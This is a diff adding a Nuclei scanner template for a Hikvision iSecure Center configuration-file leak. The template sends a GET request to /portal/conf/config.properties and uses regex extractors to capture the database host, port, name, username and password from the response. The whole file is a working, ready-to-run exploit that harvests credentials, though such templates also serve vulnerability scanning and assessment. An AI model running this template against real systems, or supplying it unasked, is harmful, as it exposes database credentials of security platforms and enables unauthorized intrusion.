@@ -1,0 +1,35 @@
+id: hikvision-isecure-config-properties_leak
+
+info:
+  name: 海康威视 iSecure Center config.properties 信息泄漏
+  author: ghosinshell
+  severity: high
+  description: |
+    海康威视 iSecure Center 综合安防管理平台中的配置文件信息泄漏漏洞。该漏洞可能导致敏感配置信息，如数据库用户名、密码等泄露。
+  tags: 海康威视, isecure, 信息泄漏
+  reference: https://github.com/ghosinshell/Nuclei-POC
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/conf/config.properties"
+    
+    matchers:
+      - type: word
+        words:
+          - "portaldb.1.@parent.@ip"
+          - "portaldb.1.@parent.port"
+          - "portaldb.1.@parent.@dbname"
+          - "portaldb.1.@parent.@dbusername"
+          - "portaldb.1.@parent.@dbpassword"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "portaldb\\.1\\.@parent\\.@ip=(.*)"         
+          - "portaldb\\.1\\.@parent\\.port=(.*)"         
+          - "portaldb\\.1\\.@parent\\.@dbname=(.*)"      
+          - "portaldb\\.1\\.@parent\\.@dbusername=(.*)"  
+          - "portaldb\\.1\\.@parent\\.@dbpassword=(.*)"  
+          
